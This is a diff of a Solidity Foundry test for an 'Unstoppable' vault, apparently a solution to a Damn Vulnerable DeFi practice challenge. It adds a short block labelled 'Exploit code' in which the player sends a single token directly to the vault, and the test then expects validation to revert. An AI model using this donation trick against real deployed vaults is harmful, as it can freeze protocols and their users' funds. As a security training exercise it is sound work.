@@ -31,10 +31,12 @@ contract UnstoppableVaultTest is Test {
         validate();
     }
 
-    function testAttackAndValidate() public {
+    function testAttack() public {
+        // Exploit code:
         vm.startPrank(player);
         token.transfer(address(vault), 1);
         vm.stopPrank();
+        //
         vm.expectRevert();
         validate();
     }
